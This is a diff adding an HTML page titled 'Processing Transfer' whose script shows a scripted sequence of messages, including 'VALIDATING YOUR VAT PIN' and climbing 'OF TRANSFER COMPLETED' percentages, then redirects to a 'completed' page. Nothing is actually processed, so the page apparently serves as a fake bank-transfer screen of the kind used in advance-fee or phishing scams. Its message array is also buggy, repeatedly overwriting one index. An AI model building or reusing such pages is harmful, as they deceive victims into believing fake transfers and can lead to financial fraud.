@@ -1,0 +1,237 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Processing Transfer</title>
+<style type="text/css">
+#black {
+	background-color: #000;
+}
+#container {
+	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	color: #FFF;
+	width: 80%;
+	margin-top: 40px;
+	margin-right: 10%;
+	margin-left: 10%;
+	padding-top: 250px;
+}
+/* these selector names are based on what you provide to the class */
+	
+	/* example 1 */
+	#box			{ border:1px solid #ccc; width:200px; height:20px; }
+	#perc			{ background:#ccc; height:20px; }
+	
+	/* example 2 */
+	#box2			{ background:url(progress-bar-back.gif) right center no-repeat; width:200px; height:20px; float:left; }
+	#perc2			{ background:url(progress-bar.gif) right center no-repeat; height:20px; }
+	#text			{ font-family:tahoma, arial, sans-serif; font-size:11px; color:#000; float:left; padding:3px 0 0 10px; }
+#centerLoader {
+	text-align: center;
+	height: auto;
+	width: 100%;
+	padding-top: 10px;
+	padding-bottom: 10px;
+}
+#counter {
+	text-align: center;
+	height: auto;
+	width: 100%;
+	padding-top: 10px;
+	padding-bottom: 10px;
+	display: none;
+}
+</style>
+<script src="dwProgressBar.js"></script>
+<script>
+/* sample usage */
+	//once the DOM is ready
+	window.addEvent('domready', function() {
+		
+		//create the progress bar for example 1
+		pb = new dwProgressBar({
+			container: $('container'),
+			startPercentage: 0,
+			speed:1000,
+			boxID: 'counter',
+			percentageID: 'perc'
+		});
+		
+		//movers
+		$$('.mover').each(function(el) {
+			el.addEvent('click',function() {
+				pb.set(el.get('rel'));
+			});
+		});
+	})
+
+</script>
+</head>
+
+<body id="black">
+<div id="container">
+<div id=splashcontainer style="WIDTH: 100%;"></div>
+<layer id=splashcontainerns width="100%"></layer>
+<div id="centerLoader"><img src="ajax-loader.gif"></div>
+<div id="counter"><img src="images/ajax-loader2.gif"></div>
+<SCRIPT>
+var preloadimages=new Array("http://abstract.simplenet.com/point.gif","http://abstract.simplenet.com/point2.gif")
+
+var intervals=3000
+//configure destination URL
+var targetdestination="completed.html"
+
+
+var splashmessage=new Array()
+var openingtags='<font face="BANK GOTHIC" size="3">'
+splashmessage[0]='INITIALIZING'
+splashmessage[1]='PROCESSING'
+splashmessage[2]='PROCESSING'
+splashmessage[3]='PLEASE WAIT.'
+splashmessage[4]='PLEASE WAIT..'
+splashmessage[5]='PLEASE WAIT...'
+splashmessage[6]='VALIDATING YOUR VAT PIN'
+splashmessage[7]='PLEASE WAIT.'
+splashmessage[8]='PLEASE WAIT..'
+splashmessage[9]='PLEASE WAIT...'
+splashmessage[10]='PLEASE WAIT'
+splashmessage[11]='PLEASE WAIT.'
+splashmessage[12]='VAT PIN VALIDATED'
+splashmessage[13]='YOUR TRANSFER DATA IS BEING COMPLETED'
+splashmessage[14]='COMPLETING TRANSFER'
+splashmessage[15]= '10%<BR>OF TRANSFER COMPLETED.'
+splashmessage[16]='18%<BR>OF TRANSFER COMPLETED..'
+splashmessage[17]='30%<BR>OF TRANSFER COMPLETED...'
+splashmessage[18]='36%<br>OF TRANSFER COMPLETED'
+splashmessage[19]='42%<br>OF TRANSFER COMPLETED.'
+splashmessage[20]='46%<br>OF TRANSFER COMPLETED..'
+splashmessage[21]='48%<br>OF TRANSFER COMPLETED...'
+splashmessage[22]='49%<br>OF TRANSFER COMPLETED'
+splashmessage[23]='56%<br>OF TRANSFER COMPLETED.'
+splashmessage[24]='57%<br>OF TRANSFER COMPLETED..'
+splashmessage[25]='58%<br>OF TRANSFER COMPLETED...'
+splashmessage[26]='59%<br>OF TRANSFER COMPLETED'
+splashmessage[27]='61%<br>OF TRANSFER COMPLETED.'
+splashmessage[28]='63%<br>OF TRANSFER COMPLETED..'
+splashmessage[29]='68%<br>OF TRANSFER COMPLETED...'
+splashmessage[30]='69%<br>OF TRANSFER COMPLETED'
+splashmessage[31]='69%<br>OF TRANSFER COMPLETED.'
+splashmessage[32]='69%<br>OF TRANSFER COMPLETED..'
+splashmessage[33]='70%<br>OF TRANSFER COMPLETED...'
+splashmessage[33]='72%<br>OF TRANSFER COMPLETED'
+splashmessage[33]='75%<br>OF TRANSFER COMPLETED.'
+splashmessage[33]='76%<br>OF TRANSFER COMPLETED..'
+splashmessage[33]='79%<br>OF TRANSFER COMPLETED...'
+splashmessage[33]='83%<br>OF TRANSFER COMPLETED'
+splashmessage[33]='87%<br>OF TRANSFER COMPLETED.'
+splashmessage[33]='89%<br>OF TRANSFER COMPLETED..'
+splashmessage[33]='92%<br>OF TRANSFER COMPLETED...'
+splashmessage[33]='94%<br>OF TRANSFER COMPLETED'
+splashmessage[33]='95%<br>OF TRANSFER COMPLETED.'
+splashmessage[33]='96%<br>OF TRANSFER COMPLETED..'
+splashmessage[33]='97%<br>OF TRANSFER COMPLETED...'
+splashmessage[33]='98%<br>OF TRANSFER COMPLETED'
+splashmessage[33]='99%<br>OF TRANSFER COMPLETED.'
+splashmessage[33]='99%<br>OF TRANSFER COMPLETED..'
+splashmessage[33]='99%<br>OF TRANSFER COMPLETED...'
+splashmessage[33]='100%<br>OF TRANSFER COMPLETED...'
+var closingtags='</font>'
+
+//Do not edit below this line (besides HTML code at the very bottom)
+
+var i=0
+
+var ns4=document.layers?1:0
+var ie4=document.all?1:0
+var ns6=document.getElementById&&!document.all?1:0
+var theimages=new Array()
+
+//preload images
+if (document.images){
+for (p=0;p<preloadimages.length;p++){
+theimages[p]=new Image()
+theimages[p].src=preloadimages[p]
+}
+}
+
+function displaysplash(){
+if (i<splashmessage.length){
+sc_cross.style.visibility="hidden"
+sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'
+sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 : document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2
+sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2 : document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2
+sc_cross.style.visibility="visible"
+i++
+}
+else{
+window.location=targetdestination
+return
+}
+setTimeout("displaysplash()",intervals)
+}
+
+function displaysplash_ns(){
+if (i<splashmessage.length){
+sc_ns.visibility="hide"
+sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')
+sc_ns.document.close()
+
+sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2
+sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2
+
+sc_ns.visibility="show"
+i++
+}
+else{
+window.location=targetdestination
+return
+}
+setTimeout("displaysplash_ns()",intervals)
+}
+
+
+
+function positionsplashcontainer(){
+if (ie4||ns6){
+sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer
+displaysplash()
+}
+else if (ns4){
+sc_ns=document.splashcontainerns
+sc_ns.visibility="show"
+displaysplash_ns()
+}
+else
+window.location=targetdestination
+}
+window.onload=positionsplashcontainer
+
+</SCRIPT>
+
+<DIV align=right> </DIV>
+<SCRIPT><!--
+ var jv=1.0;
+//--></SCRIPT>
+
+<SCRIPT language=Javascript1.1><!--
+ jv=1.1;
+//--></SCRIPT>
+
+<SCRIPT language=Javascript1.2><!--
+ jv=1.2;
+//--></SCRIPT>
+
+<SCRIPT language=Javascript1.3><!--
+ jv=1.3;
+//--></SCRIPT>
+
+<SCRIPT language=Javascript1.4><!--
+ jv=1.4;
+//--></SCRIPT>
+
+
+<NOSCRIPT><IMG height=1 src="SSL/sitestats.gif" 
+width=1></NOSCRIPT>
+</body>
+</html>
